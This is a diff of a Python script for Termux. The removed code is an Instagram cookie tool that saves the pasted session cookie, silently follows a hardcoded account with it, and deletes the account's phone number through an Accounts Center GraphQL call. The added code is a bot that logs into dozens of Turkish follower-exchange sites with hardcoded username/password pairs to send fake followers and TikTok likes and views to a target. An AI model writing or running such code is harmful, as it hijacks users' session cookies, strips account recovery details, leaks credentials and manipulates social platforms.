-               'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',
-               'x-fb-friendly-name': 'FXAccountsCenterContactPointRootQuery'})
-            data = self.data_graph(resp)
-            data.update({
-               'fb_api_req_friendly_name':'FXAccountsCenterContactPointRootQuery',
-               'variables':json.dumps({"interface":"IG_WEB"}),
-               'doc_id':'6253939098058154'
-            })
-            xnxx = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {'cookie':cookie}).text
-            if '"all_contact_points"' in str(xnxx):
-                pone = re.search('{"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(xnxx)).group(1)
-                head.update({'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation'})
-                data.update({
-                    'fb_api_req_friendly_name':'FXAccountsCenterDeleteContactPointMutation',
-                    'variables':json.dumps({"normalized_contact_point":pone,"contact_point_type":"PHONE_NUMBER","selected_accounts":[f"{self.AccountId(resp)}"],"client_mutation_id":"mutation_id_1700749992848","family_device_id":"device_id_fetch_ig_did"}),
-                    'doc_id':'6716611361758391'
-                })
-                haps = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {'cookie':cookie}).text
-                if '"success":false' in haps:status.update({'Dihapus':False,'Number':pone})
-                else:status.update({'Dihapus':True,'Number':pone})
-            else:pass
-        except Exception as e:
-            status.update({'Dihapus':False,'Number':'None'})
-        return(status)
 
-class Brute:
+
+    "habibelghoulbhiri|habib12345"
+]
+
+# ========== وظائف ==========و
+def clear():
+    os.system('clear')
+
+def show_menu():
+    clear()
+    print(logo())
     
-    def __init__(self):
-        self.tw, self.ok, self.cp, self.id, self.lp = 0, 0,0, [], 0
-        self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',}
-        self.param = {'count': '200','max_id': 'JhonChenXU','search_surface': 'follow_list_page'}
-        self.dire = 'data/termux/internal'
-        self.ipp = requests.get("https://api.ipify.org/?format=json").json()["ip"]
+    print(f"\033[1;33m» \033[0m\033[1;41m إرسال متابعين (𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜) - 1 \033[0m\n")
+    print(f"\033[1;33m» \033[0m\033[1;41m   إرسال لايكات (𝚃𝚒𝚔𝚝𝚘𝚔 𝙻𝚒𝚔𝚎𝚜) - 2 \033[0m\n")
+    print(f"\033[1;33m» \033[0m\033[1;41m   إرسال مشاهدات (𝚃𝚒𝚔𝚝𝚘𝚔 𝚅𝚒𝚎𝚠) - 3 \033[0m\n")
+    print(f"\033[1;33m» \033[0m\033[1;41m   خروج (𝙴𝚡𝚒𝚝) - 0 \033[0m\n")
 
-    def Path(self):
-        if os.path.isfile('.kukis.log') is True:
-           try:
-               cokie, nama = open('.kukis.log','r',encoding='utf-8').read().split('<=>')
-               uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
-               req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = self.head, cookies = {'cookie':cokie}).json()['user']['full_name']
-               req1 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = self.head, cookies = {'cookie':cokie}).json()['user']['follower_count']
-               req2 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = self.head, cookies = {'cookie':cokie}).json()['user']['following_count']
-               req3 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = self.head, cookies = {'cookie':cokie}).json()['user']['username']
-               return cokie, req, req1, req2, req3
-           except:
-               self.Login()
-        else:
-               self.Login()
+    return input(' \033[1;91m  ➛  \033[1;92m ') 
 
-    def Clear(self):
-        try:os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
-        except:pass
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+import time
+operation_counter = 1  # عداد تسجيل الدخولhhggggf
 
-    def Login(self):
-        self.Clear() ; self.Logos()
-        cokie = Console().input(f' {Na}[{H2}?{Na}] {B2}cookies instagram : ')
-        if 'ds_user_id' in cokie:
-            try:
-                xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
-                uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
-                ngtd = re.search("csrftoken=(.*?);", str(cokie)).group(1) ; self.followme(ngtd, cokie)
-                req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = xyz, cookies = {'cookie':cokie}).json()['user']['full_name']
-                req1 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = xyz, cookies = {'cookie':cokie}).json()['user']['username']
-                open('.kukis.log','w').write(f'{cokie}<=>{req}')
-                Console().print(f'\n {P2}[{H2}*{P2}] fullname : nama full {H2}{req}\n {P2}[{H2}*{P2}] username : nama anda {H2}@{req1}') ; time.sleep(3.3) ; self.Menu()
-            except Exception as e:
-                Console().print(f' {P2}[{M2}!{P2}] CookiesError : invalid cookies {M2}{str(e).title()}') ; time.sleep(3.1) ; self.Login()
-        else:
-            Console().print(f' {P2}[{M2}!{P2}] CookiesError : username atau cookies tidak tersedia') ; time.sleep(3.1) ; self.Login()
+def show_header(target_username):
+    
+    print("\033[2;00m")
+    print("\n" + "=" * 60)
+    print(f" \033[2;00m📱 𝙼𝚢 - 𝚄𝚜𝚎𝚛 :\033[2;32m {target_username}\033[2;00m")
+    print("=" * 60)
 
-    def followme(self, tok, cok):
-        try:
-            headers = {"Host": "i.instagram.com","content-length": "0","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',"x-ig-app-id": "1217981644879628","x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV","sec-ch-ua-mobile": "?1","x-instagram-ajax": "1006447742","viewport-width": "360","content-type": "application/x-www-form-urlencoded","accept": "*/*","user-agent": "Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)","x-asbd-id": "198387","save-data": "on","x-csrftoken": tok,"sec-ch-ua-platform": '"Android"',"origin": "https://www.instagram.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.instagram.com/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"}
-            requests.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("64474838009"), headers = headers, cookies = {"cookie":cok})
-        except requests.ConnectionError as e : self.followme()
+
+def process_site(site_name, login_url, send_follower_url, start_url_template, username, password, target_username, operation_counter):
+    show_header(target_username)
+    print(f"\n  𝙻𝚘𝚐𝚒𝚗\033[1;33m [{operation_counter}] 📦 \033[1;00m")
+
+    session = requests.Session()
+    login_resp = session.post(login_url, data={"username": username, "password": password})
+    if login_resp.status_code != 200:
+        print(f"\n    𝙤𝙣𝙡𝙞𝙣𝙚 : 📡 ")
+        return
+
+    page_resp = session.get(send_follower_url)
+    if page_resp.status_code != 200:
+        print(f"{Z} 𝙴𝚛𝚛𝚘𝚛 𝚕𝚘𝚊𝚍 𝚜𝚎𝚗𝚍-𝚏𝚘𝚕𝚕𝚘𝚠𝚎𝚛 𝚙𝚊𝚐𝚎 ❌ - {site_name}")
+        return
+    print("  𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 ✓ ")
+
+    soup = BeautifulSoup(page_resp.text, "html.parser")
+    form = None
+    for f in soup.find_all("form"):
+        btn = f.find("button", string=lambda t: t and "Kullanıcıyı Bul" in t)
+        if btn:
+            form = f
+            break
+
+    if not form:
+        print(f"{Z}  𝚎𝚛𝚛𝚘𝚛 ❌ \033[1;00m ")
+        return
+
+    action = form.get("action") or send_follower_url
+    if not action.startswith("http"):
+        action = urljoin(send_follower_url, action)
+
+    post_data = {input_tag.get("name"): input_tag.get("value", "") for input_tag in form.find_all("input") if input_tag.get("name")}
+    post_data["username"] = target_username
+
+    submit_resp = session.post(action, data=post_data)
+    if submit_resp.status_code != 200:
+        print(f"{Z}  𝚎𝚛𝚛𝚘𝚛 ❌ \033[1;00m ")
+        return
+    print("  𝙾𝙺 📤  ")
+    
+
+    soup2 = BeautifulSoup(submit_resp.text, "html.parser")
+
+    userID = soup2.find("input", {"name": "userID"}).get("value", None)
+    userName = soup2.find("input", {"name": "userName"}).get("value", None)
+
+    if not userID or not userName:
+        print(f"{Z}  𝚎𝚛𝚛𝚘𝚛 ❌ ")
+        return
+
+    start_url = start_url_template.format(userID=userID)
+    start_data = {
+        "adet": "5000",
+        "userID": userID,
+        "userName": userName
+    }
+    start_resp = session.post(start_url, data=start_data)
+    time.sleep(3)
+    if start_resp.status_code == 200:
+        print("  𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : 𝙾𝙺 🚀 ")
+    else:
+        print(f"🚀 𝙵𝚊𝚒𝚕 ({start_resp.status_code})")
+    time.sleep(4)
+
+    
+    
+    
+def process_takipcimx(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takipcimx.net",
+        login_url="https://takipcimx.net/login",
+        send_follower_url="https://takipcimx.net/tools/send-follower",
+        start_url_template="https://takipcimx.net/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+def process_bayitakipci(username, password, target_username, operation_counter):
+    process_site(
+        site_name="bayitakipci.com",
+        login_url="https://bayitakipci.com/memberlogin",
+        send_follower_url="https://bayitakipci.com/tools/send-follower",
+        start_url_template="https://bayitakipci.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+
+def process_takipcikrali(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takipcikrali.com",
+        login_url="https://takipcikrali.com/login",
+        send_follower_url="https://takipcikrali.com/tools/send-follower",
+        start_url_template="https://takipcikrali.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+
+    
+def process_takipcikingnet(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takipciking.net",
+        login_url="https://takipciking.net/login",
+        send_follower_url="https://takipciking.net/tools/send-follower",
+        start_url_template="https://takipciking.net/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+def process_platintakipci(username, password, target_username, operation_counter):
+    process_site(
+        site_name="platintakipci.com",
+        login_url="https://platintakipci.com/member",
+        send_follower_url="https://platintakipci.com/tools/send-follower",
+        start_url_template="https://platintakipci.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+def process_takipcigen(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takipcigen.com",
+        login_url="https://takipcigen.com/login",
+        send_follower_url="https://takipcigen.com/tools/send-follower",
+        start_url_template="https://takipcigen.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+def process_bigtakip(username, password, target_username, operation_counter):
+    process_site(
+        site_name="bigtakip.net",
+        login_url="https://bigtakip.net/login",
+        send_follower_url="https://bigtakip.net/tools/send-follower",
+        start_url_template="https://bigtakip.net/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+
+def process_takipcitime(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takipcitime.net",
+        login_url="https://takipcitime.net/login",
+        send_follower_url="https://takipcitime.net/tools/send-follower",
+        start_url_template="https://takipcitime.net/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+def process_takipzan(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takipzan.com",
+        login_url="https://takipzan.com/login",
+        send_follower_url="https://takipzan.com/tools/send-follower",
+        start_url_template="https://takipzan.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+def process_followersize_net(username, password, target_username, operation_counter):
+    process_site(
+        site_name="followersize.net",
+        login_url="https://followersize.net/login",
+        send_follower_url="https://followersize.net/tools/send-follower",
+        start_url_template="https://followersize.net/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+    
+def process_birtakipci(username, password, target_username, operation_counter):
+    process_site(
+        site_name="birtakipci.net",
+        login_url="https://birtakipci.net/login",
+        send_follower_url="https://birtakipci.net/tools/send-follower",
+        start_url_template="https://birtakipci.net/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+    
+def process_mixtakip(username, password, target_username, operation_counter):
+    process_site(
+        site_name="mixtakip.com",
+        login_url="https://mixtakip.com/login",
+        send_follower_url="https://mixtakip.com/tools/send-follower",
+        start_url_template="https://mixtakip.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+
+def process_instamoda(username, password, target_username, operation_counter):
+    process_site(
+        site_name="instamoda.org",
+        login_url="https://instamoda.org/login",
+        send_follower_url="https://instamoda.org/tools/send-follower",
+        start_url_template="https://instamoda.org/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+    
+    
+def process_takipcitime_com(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takipcitime.com",
+        login_url="https://takipcitime.com/login",
+        send_follower_url="https://takipcitime.com/tools/send-follower",
+        start_url_template="https://takipcitime.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+def process_birtakipci_com(username, password, target_username, operation_counter):
+    process_site(
+        site_name="birtakipci.com",
+        login_url="https://birtakipci.com/member",
+        send_follower_url="https://birtakipci.com/tools/send-follower",
+        start_url_template="https://birtakipci.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+def process_takipcibase(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takipcibase.com",
+        login_url="https://takipcibase.com/login",
+        send_follower_url="https://takipcibase.com/tools/send-follower",
+        start_url_template="https://takipcibase.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+    
+def process_takip88(username, password, target_username, operation_counter):
+    process_site(
+        site_name="takip88.com",
+        login_url="https://takip88.com/login",
+        send_follower_url="https://takip88.com/tools/send-follower",
+        start_url_template="https://takip88.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    #1️⃣1️⃣1️⃣1️⃣1️⃣1️⃣1️⃣1️⃣1️⃣1️⃣
+def process_followersize_com(username, password, target_username, operation_counter):
+    process_site(
+        site_name="followersize.com",
+        login_url="https://followersize.com/member",
+        send_follower_url="https://followersize.com/tools/send-follower",
+        start_url_template="https://followersize.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+
+    
+    
+    #2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣2️⃣
+def process_medyahizmeti(username, password, target_username, operation_counter):
+    process_site(
+        site_name="medyahizmeti.com",
+        login_url="https://medyahizmeti.com/member",
+        send_follower_url="https://medyahizmeti.com/tools/send-follower",
+        start_url_template="https://medyahizmeti.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+    
+def process_hepsitakipci(username, password, target_username, operation_counter):#1111113️⃣3️⃣3️⃣3️⃣3️⃣3️⃣3️⃣3️⃣3️⃣3️⃣
+    process_site(
+        site_name="hepsitakipci.com",
+        login_url="https://www.hepsitakipci.com/member",
+        send_follower_url="https://www.hepsitakipci.com/tools/send-follower",
+        start_url_template="https://www.hepsitakipci.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+    
+
+def process_tiktok_like(username, password, video_url):
+    session = requests.Session()
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "Mozilla/5.0"
+    }
+    login_resp = session.post("https://followersize.com/member",
+                              data={"username": username, "password": password},
+                              headers=headers, verify=False)
+    if login_resp.status_code != 200:
+        print(f"{Z}❌ خطأ تسجيل دخول {username}")
+        return
+
+    print("\n\033[2;00m" + "=" * 60)
+    print(f"\n\033[1;31m 𝚜𝚎𝚗𝚝 𝙻𝚒𝚔𝚜 𝚝𝚘 𝚟𝚒𝚍𝚎𝚘 (لايكلات) : \033[2;32m{video_url} 👁️ \033[1;00m\n")
+    print("=" * 60)
+    print("")
+    post_data = {"mediaUrl": video_url, "adet": "20"}
+    send_resp = session.post("https://followersize.com/tools/send-tiktok-like?formType=send",
+                             data=post_data, headers=headers, verify=False)
+    if send_resp.status_code == 200:
+        print(f"")
+    else:
+        print(f"Erro")
+    time.sleep(2)
+
+def process_tiktok_view(username, password, video_url):
+    session = requests.Session()
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "Mozilla/5.0"
+    }
+    login_resp = session.post("https://followersize.com/member",
+                              data={"username": username, "password": password},
+                              headers=headers, verify=False)
+    if login_resp.status_code != 200:
+        print(f"❌ فشل تسجيل الدخول {username}")
+        return
+
+    
+    print("\n\033[2;00m" + "=" * 60)
+    print(f"\n\033[1;31m 𝚜𝚎𝚗𝚝 𝚅𝚒𝚎𝚠𝚜 𝚝𝚘 𝚟𝚒𝚍𝚎𝚘 (مشاهدات) : \033[2;32m{video_url} 👁️ \033[1;00m\n")
+    print("=" * 60)
+    print("")
+    post_data = {"mediaUrl": video_url, "adet": "500"}
+    send_resp = session.post("https://followersize.com/tools/send-tiktok-view?formType=send",
+                             data=post_data, headers=headers, verify=False)
+    if send_resp.status_code == 200:
+        print(f"")
+    else:
+        print(f"❌ error")
+    time.sleep(1.5)
+    
+def process_takipcizencom(username, password, target_username, operation_counter):#9
+    process_site(
+        site_name="takipcizen.com",
+        login_url="https://takipcizen.com/login",
+        send_follower_url="https://takipcizen.com/tools/send-follower",
+        start_url_template="https://takipcizen.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+    
+def process_takipstarcom(username, password, target_username, operation_counter):#8
+    process_site(
+        site_name="takipstar.com",
+        login_url="https://takipstar.com/login",
+        send_follower_url="https://takipstar.com/tools/send-follower",
+        start_url_template="https://takipstar.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+def process_takipcikingcom(username, password, target_username, operation_counter):#7
+    process_site(
+        site_name="takipciking.com",
+        login_url="https://takipciking.com/member",
+        send_follower_url="https://takipciking.com/tools/send-follower",
+        start_url_template="https://takipciking.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+    
+def process_takipcigir(username, password, target_username, operation_counter):#6
+    process_site(
+        site_name="takipcigir.com",
+        login_url="https://takipcigir.com/login",
+        send_follower_url="https://takipcigir.com/tools/send-follower",
+        start_url_template="https://takipcigir.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+
+def process_takipcimx_com(username, password, target_username, operation_counter):#4
+    process_site(
+        site_name="takipcimx.com",
+        login_url="https://takipcimx.com/member",
+        send_follower_url="https://takipcimx.com/tools/send-follower",
+        start_url_template="https://takipcimx.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+
+    
+def process_takipcimax(username, password, target_username, operation_counter):#3
+    process_site(
+        site_name="takipcimax.com",
+        login_url="https://takipcimax.com/login",
+        send_follower_url="https://takipcimax.com/tools/send-follower",
+        start_url_template="https://takipcimax.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )#&&
+
+    
+
+def process_bigtakip_com(username, password, target_username, operation_counter):#2
+    process_site(
+        site_name="bigtakip.com",
+        login_url="https://bigtakip.com/member",
+        send_follower_url="https://bigtakip.com/tools/send-follower",
+        start_url_template="https://bigtakip.com/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+    
+def process_fastfollow(username, password, target_username, operation_counter):#1
+    process_site(
+        site_name="fastfollow.in",
+        login_url="https://fastfollow.in/member",
+        send_follower_url="https://fastfollow.in/tools/send-follower",
+        start_url_template="https://fastfollow.in/tools/send-follower/{userID}?formType=send",
+        username=username,
+        password=password,
+        target_username=target_username,
+        operation_counter=operation_counter
+    )
+
+# ========== القائمة ==========jjنjjbb
+while True:
+    option = show_menu()
+
+    if option == "1":
+        clear()
+        print(logo())
+        print("")
+
+        target_username = input(f'{CYAN} 🧾 ᴜsᴇʀ  \033[1;00m: \033[1;92m ').strip()
+        clear()
+        print(logo())
+        operation_counter = 1  # إعادة التهيئة هنhا
+        for acc in accounts:
+            username, password = acc.split("|")
             
-    def Logos(self):
-        Console().print(f"""\033{Na}
+            
+            process_followersize_com(username, password, target_username, operation_counter)#1
+            operation_counter += 1
+            process_medyahizmeti(username, password, target_username, operation_counter)
+            operation_counter += 1   
+            process_hepsitakipci(username, password, target_username, operation_counter)
+            operation_counter += 1
+            
+            process_instamoda(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcitime_com(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_birtakipci_com(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcibase(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takip88(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcitime(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipzan(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_followersize_net(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_birtakipci(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_mixtakip(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcikrali(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcikingnet(username, password, target_username, operation_counter)#
+            operation_counter += 1
 
-                      _______________
-                     < 𝚁𝚊𝚢𝚎𝚗-𝙶𝚊𝚖𝚘𝚞𝚍𝚒 >V1
-
-\033{H2}                                 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
-   ₊‧.°.⋆☠️•˚₊‧⋆.⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
-  [■■■■■■■■■■] 100%⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
-⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
-⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
-⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
-⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
-⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
-⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
